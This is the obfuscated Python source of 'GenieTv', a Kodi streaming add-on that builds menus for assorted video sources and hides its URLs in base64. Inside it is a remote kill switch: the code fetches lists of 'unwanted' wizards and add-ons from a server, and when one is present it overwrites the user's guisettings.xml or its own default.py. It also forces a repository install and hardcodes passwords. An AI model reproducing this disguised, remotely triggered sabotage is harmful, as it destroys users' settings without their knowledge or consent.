# -*- coding: cp1252 -*-
import xbmc , xbmcaddon , xbmcgui , xbmcplugin , os , base64 , sys , xbmcvfs , unicodedata
import urlresolver
from imports import cloudflare , googleplus , client , cleantitle , cache
from imports import yt
import httplib
import requests
import urlparse
import shutil
import binascii
import subprocess
import urllib2 , urllib , glob , traceback
import re
from imports import extract
from imports import downloader
import plugintools
import zipfile
import time
import ntpath
import cookielib
from imports import Parse , CNF_Studio_Indexer
try :
 import json
except :
 import simplejson as json
from urllib2 import urlopen
from bs4 import BeautifulSoup
from BeautifulSoup import BeautifulStoneSoup , BeautifulSOAP
from cookielib import CookieJar
from addon . common . addon import Addon
from addon . common . net import Net
from imports . tvGuide import gui
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = ''
def oo ( i , t1 , t2 = [ ] ) :
 i1iII1IiiIiI1 = o0OO00
 for iIiiiI1IiI1I1 in t1 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 for iIiiiI1IiI1I1 in t2 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 return i1iII1IiiIiI1
 if 87 - 87: OoOoOO00
 if 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI
 if 73 - 73: OOooOOo / ii11ii1ii
O00ooOO = "2.8.0"
I1iII1iiII = xbmc . translatePath ( 'special://home/addons/repository.GenieTv' )
iI1Ii11111iIi = xbmc . translatePath ( 'special://home/addons/' )
i1i1II = xbmc . translatePath ( 'special://home/addonsbroke/' )
O0oo0OO0 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'
I1i1iiI1 = 'plugin.video.GenieTv'
iiIIIII1i1iI = [ 'plugin.video.GenieTv' , 'script.module.addon.common' , 'repository.GenieTv' ]
o0oO0 = xbmcaddon . Addon ( id = I1i1iiI1 )
oo00 = xbmc . translatePath ( 'special://home/media' )
o00 = 'plugin.video.GenieTv'
Oo0oO0ooo = xbmcgui . DialogProgress ( )
o0oOoO00o = "[COLORgreen]GenieTv[/COLOR]"
i1 = Net ( )
oOOoo00O0O = xbmcgui . Dialog ( )
i1111 = base64 . decodestring
i11 = o0oO0 . getSetting ( 'Build' )
I11 = o0oO0 . getSetting ( 'Local' )
Oo0o0000o0o0 = o0oO0 . getSetting ( 'Remote' )
oOo0oooo00o = o0oO0 . getSetting ( 'LocalM3u' )
oO0o0o0ooO0oO = o0oO0 . getSetting ( 'User' )
oo0o0O00 = o0oO0 . getSetting ( 'Pass' )
oO = o0oO0 . getSetting ( 'AdultPass' )
i1iiIIiiI111 = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'fanart.jpg' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'icon.png' , i1iiIII111ii , '' ) )
ii11iIi1I = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQv' ) )
iI111I11I1I1 = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQvb3JpZ2luLnBuZw==' ) )
OOooO0OOoo = xbmc . translatePath ( 'special://database' )
iIii1 = xbmc . translatePath ( 'special://home/userdata/addon_data/plugin.video.GenieTV' )
oOOoO0 = xbmc . translatePath ( 'special://thumbnails' ) ;
O0OoO000O0OO = "GenieTv"
iiI1IiI = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20=' ) )
II = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/Change_Log_Temp' ) )
OooO0 = 'http://'
II11iiii1Ii = base64 . decodestring ( 'LnBocA==' )
OO0o = base64 . decodestring ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC8=' )
Ooo = [ ]
O0o0Oo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/imports/tvGuide/ResetDatabase.py' ) )
Oo00OOOOO = o0oO0 . getLocalizedString
O0O = CookieJar ( )
O00o0OO = urllib2 . build_opener ( urllib2 . HTTPCookieProcessor ( O0O ) )
O00o0OO . addheaders = [ ( 'User-Agent' , 'Mozilla/5.0' ) ]
I11i1 = int ( sys . argv [ 1 ] )
iIi1ii1I1 = xbmc . translatePath ( o0oO0 . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
o0 = os . path . join ( iIi1ii1I1 , 'favorites' )
I11II1i = iIii1 + '/addons.ini'
IIIII = xbmc . translatePath ( 'special://home/userdata/' )
ooooooO0oo = xbmc . translatePath ( 'special://home/userdatabroke/' )
IIiiiiiiIi1I1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9QYW5zQm94L09SSUdJTlMv' ) )
I1IIIii = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.ivueguide/master.db' ) )
oOoOooOo0o0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , 'favourites.xml' ) )
OOOO = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/plugin.video.GenieTv/favorites' ) )
OOO00 = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/addon.xml' ) )
iiiiiIIii = xbmc . translatePath ( os . path . join ( 'special://home/addons/Repository.GenieTv/addon.xml' ) )
if os . path . exists ( o0 ) == True :
 O000OO0 = open ( o0 ) . read ( )
else : O000OO0 = [ ]
I11iii1Ii = o0oO0 . getSetting ( 'debug' )
if os . path . exists ( iIii1 ) == False :
 os . makedirs ( iIii1 )
I1IIiiIiii = 'http://architects.x10host.com/safety/index.php?mode=XxX&password=fordfiesta'
if 97 - 97: Ooo0OO0oOO - i11i1 + OOoo0OO0 / oO0O - II1i1IiiIIi11 % iI1Ii11iII1
if 51 - 51: I1I1ii * oOO - OOooOOo - OOOo0 + i11i1 / ii11ii1ii
def I1 ( ) :
 if not os . path . exists ( I1iII1iiII ) :
  oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will only work with its official repo" , 'it will now be installed for you' , '' )
  OO00Oo ( )
 else :
  if not os . path . exists ( xbmc . translatePath ( os . path . join ( 'special://home/addons/service.xbmc.cleanse' ) ) ) :
   OO00Oo ( )
  else :
   O0OOO0OOoO0O ( )
   if 70 - 70: iI1Ii11iII1 * Oo * OOoo0OO0 / oO0O
def O0OOO0OOoO0O ( ) :
 if 88 - 88: O0
 O0OoO0O00o0oO = I1ii1Ii1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvYmxvYi9tYXN0ZXIvVmVyc2lvbl9Mb2cudHh0' ) )
 iii11 = open ( OOO00 ) . read ( )
 oOOOOo0 = open ( iiiiiIIii ) . read ( )
 if 20 - 20: i1IIi + ii11ii1ii - oOO
 IiI11iII1 = re . compile ( 'version="(.+?)" provider' ) . findall ( iii11 )
 IIII11I1I = re . compile ( 'version="(.+?)" provider-name' ) . findall ( oOOOOo0 )
 OOO0o = re . compile ( 'GENIE TV ADDON - Version = &quot;(.+?)&quot;' ) . findall ( O0OoO0O00o0oO )
 IiI1 = re . compile ( 'GENIE TV REPO - Version = &quot;(.+?)&quot;' ) . findall ( O0OoO0O00o0oO )
 for Oo0O00Oo0o0 in IiI11iII1 :
  O00O0oOO00O00 = Oo0O00Oo0o0
  for i1Oo00 in OOO0o :
   if not i1Oo00 == O00O0oOO00O00 :
    Oo0oO0ooo . create ( 'Incorrect Addon Version' , 'Downloading Correct Version' , )
    xbmc . sleep ( 1000 )
    Oo0oO0ooo . close
    i1i ( )
   if i1Oo00 == O00O0oOO00O00 :
    pass
 for iiI111I1iIiI in IIII11I1I :
  IIIi1I1IIii1II = iiI111I1iIiI
  for O0ii1ii1ii in IiI1 :
   if not O0ii1ii1ii == IIIi1I1IIii1II :
    Oo0oO0ooo . create ( 'Incorrect Repo Installed' , 'Installing Correct Version' , '' )
    xbmc . sleep ( 1000 )
    Oo0oO0ooo . close
    OO00Oo ( )
   if O0ii1ii1ii == IIIi1I1IIii1II :
    xbmc . sleep ( 100 )
    pass
def oooooOoo0ooo ( ) :
 I1 ( )
 I1I1IiI1 ( )
 III1iII1I1ii ( )
 oOOo0 ( )
 oo00O00oO ( '[COLORgreen]Force Genie Update Kodi 16+[/COLOR]' , i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVwby9yZXBvc2l0b3J5LkdlbmllVHYtMC4xLjAuemlw' ) , 10085 , ii11iIi1I + 'updategenie.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'My Build' ) == 'true' :
  iIiIIIi ( '[COLORgreen]WIZARD[/COLOR]' , iiI1IiI , 4001 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Streams' ) == 'true' :
  iIiIIIi ( '[COLORgreen]STREAMS[/COLOR]' , iiI1IiI , 4002 , ii11iIi1I + 'streams.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Music' ) == 'true' :
  iIiIIIi ( '[COLORgreen]Music[/COLOR]' , iiI1IiI , 4003 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
  if 93 - 93: II1i1IiiIIi11
 if o0oO0 . getSetting ( 'Builders Toolbox' ) == 'true' :
  iIiIIIi ( '[COLORgreen]BUILDERS TOOLBOX[/COLOR]' , iiI1IiI , 32 , ii11iIi1I + 'builderstoolbox.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Source List' ) == 'true' :
  iIiIIIi ( '[COLORgreen]SOURCE LIST[/COLOR]' , iiI1IiI , 46 , ii11iIi1I + 'sources.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Maintainance' ) == 'true' :
  iIiIIIi ( '[COLORgreen]MAINTENANCE[/COLOR]' , iiI1IiI , 3 , ii11iIi1I + 'MAIN6.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons' ) == 'true' :
  iIiIIIi ( '[COLORgreen]ADDONS[/COLOR]' , '' , 10050 , ii11iIi1I + 'ADDONS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'APK Tool' ) == 'true' :
  iIiIIIi ( '[COLORgreen]APK TOOL[/COLOR]' , iiI1IiI , 2 , ii11iIi1I + 'APK.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Rss Feed' ) == 'true' :
  iIiIIIi ( '[COLORgreen]GenieTv RSS Feed[/COLOR]' , iiI1IiI , 39 , ii11iIi1I + 'RSS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons Packs' ) == 'true' :
  iIiIIIi ( '[COLORgreen]ADDONS PACKS[/COLOR]' , iiI1IiI , 30 , ii11iIi1I + 'ADDONP.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 87 - 87: Ooo0OO0oOO * ii11ii1ii + i11i1 / iIii1I11I1II1 / II1i1IiiIIi11
def I1111IIi ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]BACKUP MY BUILD[/COLOR]' , iiI1IiI , 10060 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]RESTORE MY BUILD[/COLOR]' , iiI1IiI , 49 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]WIPE GENIE[/COLOR]' , iiI1IiI , 41 , ii11iIi1I + 'wipegenie.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]WISHES PC[/COLOR]' , iiI1IiI , 1 , ii11iIi1I + 'WISHESPC.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]WISHES ANDROID[/COLOR]' , iiI1IiI , 44 , ii11iIi1I + 'WISHESAN.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
def Oo0oO ( ) :
 I1 ( )
 if oO == '5knuckleshuffle' :
  iIiIIIi ( '[COLORgreen]XVID[/COLOR]' , iiI1IiI , 10100 , ii11iIi1I + 'JIZBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Favourites' ) == 'true' :
  iIiIIIi ( '[COLORgreen]FAVOURITES[/COLOR]' , iiI1IiI , 10057 , ii11iIi1I + 'FAVORITES.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Search' ) == 'true' :
  iIiIIIi ( '[COLORgreen]SEARCH[/COLOR]' , iiI1IiI , 9000 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Live TV[/COLOR]' , iiI1IiI , 4009 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]MOVIES[/COLOR]' , iiI1IiI , 4004 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]TV SHOWS[/COLOR]' , iiI1IiI , 4005 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]STREAM TEAM[/COLOR]' , iiI1IiI , 4006 , ii11iIi1I + 'streamteam.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 4007 , ii11iIi1I + 'KIDSv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]HOBBIES[/COLOR]' , iiI1IiI , 4008 , ii11iIi1I + 'hobbies.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'YOUTUBE' ) == 'true' :
  iIiIIIi ( '[COLORgreen]SEARCH YOUTUBE[/COLOR]' , iiI1IiI , 10064 , ii11iIi1I + 'youtube.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'REQUESTS' ) == 'true' :
  iIiIIIi ( '[COLORgreen]REQUESTS[/COLOR]' , iiI1IiI + ( i1111 ( 'L1JFUVVFU1RTLnBocA==' ) ) , 10066 , ii11iIi1I + 'requests.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Stand Up' ) == 'true' :
  iIiIIIi ( '[COLORgreen]STAND UP[/COLOR]' , '' , 10003 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Documentaries' ) == 'true' :
  iIiIIIi ( '[COLORgreen]DOCUMENTARIES[/COLOR]' , iiI1IiI , 8040 , ii11iIi1I + 'documentary.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Disclose' ) == 'true' :
  iIiIIIi ( '[COLORgreen]DISCLOSE TV[/COLOR]' , iiI1IiI , 7001 , ii11iIi1I + 'disclose.png' , i1iiIII111ii , '' )
  if 1 - 1: Ooo00oOo00o - Ooo0OO0oOO . OOoo0OO0 . Ooo00oOo00o / Oo + OOoo0OO0
  if 78 - 78: O0 . Ooo0OO0oOO . OoOoOO00 % i11i1
 if o0oO0 . getSetting ( 'Playlist Loader' ) == 'true' :
  iIiIIIi ( '[COLORgreen]PLAYLIST LOADER[/COLOR]' , iiI1IiI , 3000 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
  if 49 - 49: oO0O / Ooo00oOo00o . OoOoOO00
  if 68 - 68: i11iIiiIii % ii11ii1ii + i11iIiiIii
  if 31 - 31: OoOoOO00 . OOOo0
  if 1 - 1: Oo / OOooOOo % II1i1IiiIIi11 * iI1Ii11iII1 . i11iIiiIii
  if 2 - 2: ii11ii1ii * OOoo0OO0 - iIii1I11I1II1 + OOOo0 . Ooo0OO0oOO % II1i1IiiIIi11
  if 92 - 92: II1i1IiiIIi11
  if 25 - 25: Oo - OOOo0 / OoooooooOO / OOooOOo
  if 12 - 12: OOOo0 * II1i1IiiIIi11 % i1IIi % iIii1I11I1II1
  if 20 - 20: i11i1 % oO0O / oO0O + oO0O
  if 45 - 45: Ooo0OO0oOO - iI1Ii11iII1 - OoooooooOO - Ooo00oOo00o . OoOoOO00 / O0
  if 51 - 51: O0 + II1i1IiiIIi11
  if 8 - 8: Ooo0OO0oOO * I1IiI - oO0O - Ooo00oOo00o * i11i1 % OOOo0
  if 48 - 48: O0
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 11 - 11: OOoo0OO0 + OoooooooOO - Ooo00oOo00o / OOooOOo + Oo . OoOoOO00
def I1I1IiI1 ( ) :
 if not os . path . exists ( ooOoOoo0O ) :
  i1Iii1i1I ( 'Change Log 01/05/16 - v2.7.9' , 'Fixing Tv Guide Link Button, should have full pics and most channels showing data in guide now \n\n\nAlso taken a bad source out of movie search and added progress bars so wait time doesnt seem so long' )
  os . makedirs ( ooOoOoo0O )
  if 91 - 91: ii11ii1ii + OOOo0 . i11i1 * ii11ii1ii + OOOo0 * Oo
  if 80 - 80: II1i1IiiIIi11 % i11i1 % Ooo0OO0oOO - Oo + Oo
def iIiii1i111iI1 ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Popcorn Box' ) == 'true' :
  iIiIIIi ( '[COLORgreen]POPCORN BOX[/COLOR]' , iiI1IiI , 7061 , ii11iIi1I + 'popcorn.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Film Trailers[/COLOR]' , i1111 ( 'aHR0cDovL3RoZW1vdmllYm94Lm5ldC9leHBsb3Jl' ) , 10068 , ii11iIi1I + 'movietrailers.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC MOVIES' ) == 'true' :
  iIiIIIi ( '[COLORgreen]CLASSIC MOVIES[/COLOR]' , '' , 8060 , ii11iIi1I + 'classicmovies.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
def i11oO0oOo0 ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'G-tv' ) == 'true' :
  iIiIIIi ( '[COLORgreen]G-Tv PRIVATE LIST[/COLOR]' , '' , 10058 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'TV GUIDE' ) == 'true' :
  oo00O00oO ( '[COLORgreen]TV GUIDE[/COLOR]' , '' , 10063 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 oo00O00oO ( '[COLORgreen]Link GTV Donators Username and Password to Guide[/COLOR]' , '' , 4010 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if 45 - 45: II1i1IiiIIi11 / II1i1IiiIIi11 + I1I1ii + oOO
 if 47 - 47: OOooOOo + oOO
def OoO ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Dizzy Tv' ) == 'true' :
  iIiIIIi ( '[COLORgreen]DIZZY TV[/COLOR]' , '' , 10018 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Watch Series' ) == 'true' :
  iIiIIIi ( '[COLORgreen]WATCH SERIES[/COLOR]' , '' , 10040 , ii11iIi1I + 'WATCHSERIES.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]iWATCH SERIES[/COLOR]' , '' , 8020 , ii11iIi1I + 'iwatch.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Recent Episodes' ) == 'true' :
  iIiIIIi ( '[COLORgreen]RECENT EPISODES[/COLOR]' , iiI1IiI , 8081 , ii11iIi1I + 'recent.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC TV' ) == 'true' :
  iIiIIIi ( '[COLORgreen]CLASSIC TV[/COLOR]' , iiI1IiI , 8064 , ii11iIi1I + 'classictv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]TV Show Trailers[/COLOR]' , i1111 ( 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj03WkZJUzJBcUF6OCZsaXN0PVBMM2t4NWgyVHJZR3dwVzBWYk5lbnBqLUJLTUJUR2dKUEU=' ) , 10069 , ii11iIi1I + 'tvtrailers.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]TV Show Schedule[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'tvschedule.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
def O00 ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'Scooby Streams' ) == 'true' :
  iIiIIIi ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , iiI1IiI , 1023 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'The Reaper' ) == 'true' :
  iIiIIIi ( '[COLORgreen]THE REAPER[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'reap.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Pandoras Box' ) == 'true' :
  iIiIIIi ( '[COLORgreen]PANDORAS BOX[/COLOR]' , iiI1IiI , 10025 , ii11iIi1I + 'PANDORASBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'HeroVision' ) == 'true' :
  iIiIIIi ( '[COLORgreen]HEROVISION[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tYWluLnBocA==' ) ) , 1016 , ii11iIi1I + 'hero.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Silent Hunter' ) == 'true' :
  iIiIIIi ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 10084 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Redemption Streams' ) == 'true' :
  iIiIIIi ( '[COLORgreen]Redemption Streams[/COLOR]' , ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'redemption.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]ITV[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9tYWluLnBocA==' ) ) , 1016 , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9pdHZzdHJlYW1zLnBuZw==' ) ) , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 29 - 29: I1I1ii / Ooo00oOo00o . i1IIi * OOOo0 + i11iIiiIii
def I1Ii ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 1006 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SILENT HUNTER SCRAPES[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if 94 - 94: oO0O - OoOoOO00 . i11i1 % OOoo0OO0 . i11iIiiIii + O0
 if 26 - 26: OOoo0OO0 - iIii1I11I1II1 - OOOo0 / Ooo00oOo00o . I1IiI % iIii1I11I1II1
 if 91 - 91: OOooOOo . iIii1I11I1II1 / Ooo0OO0oOO + i1IIi
def I1i ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'WCO' ) == 'true' :
  iIiIIIi ( '[COLORgreen]WATCH CARTOONS ONLINE[/COLOR]' , iiI1IiI , 21004 , ii11iIi1I + 'watchcartoons.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Cartoons' ) == 'true' :
  iIiIIIi ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 10001 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Anime' ) == 'true' :
  iIiIIIi ( '[COLORgreen]AnimeLand[/COLOR]' , ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2R1YmJlZC1hbmltZQ==' ) ) , 10004 , ii11iIi1I + 'anime.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
def OOOOO0oo0O0O0 ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'Football' ) == 'true' :
  iIiIIIi ( '[COLORgreen]FOOTBALL[/COLOR]' , '' , 10002 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Fitness' ) == 'true' :
  iIiIIIi ( '[COLORgreen]FITNESS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cuZml0bmVzc2JsZW5kZXIuY29tL3ZpZGVvcw==' ) ) , 7085 , ii11iIi1I + 'FITNESS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Go Fishing' ) == 'true' :
  iIiIIIi ( '[COLORgreen]Go Fishing[/COLOR]' , iiI1IiI , 8090 , ii11iIi1I + 'gofish.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'GenieTv Kitchen' ) == 'true' :
  iIiIIIi ( '[COLORgreen]GenieTv Kitchen[/COLOR]' , ( i1111 ( 'aHR0cDovL2Zvb2QubmR0di5jb20vdmlkZW9z' ) ) , 8045 , ii11iIi1I + 'geniekitchen.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 74 - 74: OOooOOo . II1i1IiiIIi11
 if 18 - 18: i11i1 + II1i1IiiIIi11 - oO0O . OoOoOO00 + i11iIiiIii
 if 20 - 20: I1I1ii
def oOOo0 ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://architects.x10host.com/wizarddelete.txt' )
 IiI11iII1 = re . compile ( '<unwanted_wizard =(.+?)</unwanted_wizard>' ) . findall ( Oo0oO00o )
 for i11I1II1I11i in IiI11iII1 :
  print i11I1II1I11i
  i11I1II1I11i = ( str ( i11I1II1I11i ) )
  if os . path . exists ( xbmc . translatePath ( i11I1II1I11i ) ) :
   OooOoOO0 = os . path . join ( IIIII , 'guisettings.xml' )
   iI1i11iII111 = open ( OooOoOO0 , "w+" )
   if 15 - 15: i11iIiiIii % oO0O . Oo + ii11ii1ii
   iI1i11iII111 . write ( r'.' )
   OO0OOOOoo0OOO ( )
  else :
   pass
   if 27 - 27: oOO + OoOoOO00
def III1iII1I1ii ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://architects.x10host.com/testdelete.txt' )
 IiI11iII1 = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( Oo0oO00o )
 for o0O in IiI11iII1 :
  o0O = ( str ( o0O ) )
  if os . path . exists ( xbmc . translatePath ( o0O ) ) :
   o00iI ( o0O )
   O0O0Oooo0o ( )
  else :
   pass
   if 56 - 56: ii11ii1ii % O0 - OOOo0
def o00iI ( addon ) :
 oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will not work with" , addon , 'please remove then reinstall genie' )
 OooOoOO0 = os . path . join ( II , 'default.py' )
 iI1i11iII111 = open ( OooOoOO0 , "w+" )
 if 100 - 100: oO0O - O0 % Ooo0OO0oOO * i11i1 + OOOo0
 iI1i11iII111 . write ( r'Genie Tv will not work with certain addons in an attempt to bring you original content from the best developers' )
 iI1i11iII111 . write ( r'and not those simply out to profit or make a name for themselves off others work' )
 iI1i11iII111 . write ( r'Please remove' + unwanted_addons + 'if you would like to use genie tv then uninstall and reinstall from official repo' )
 if 88 - 88: OoooooooOO - Ooo00oOo00o * O0 * OoooooooOO . OoooooooOO
 if 33 - 33: I1I1ii + II1i1IiiIIi11 * Ooo0OO0oOO / iIii1I11I1II1 - OOOo0
def OO0OOOOoo0OOO ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) )
 O0oO = re . compile ( '<tr>.+?title="(.+?)">(.+?)</tr>' , re . DOTALL ) . findall ( Oo0oO00o )
 for OO0ooOOO0OOO , O0oO in O0oO :
  OO0ooOOO0OOO = OO0ooOOO0OOO
  IiI11iII1 = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)\n</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( O0oO ) )
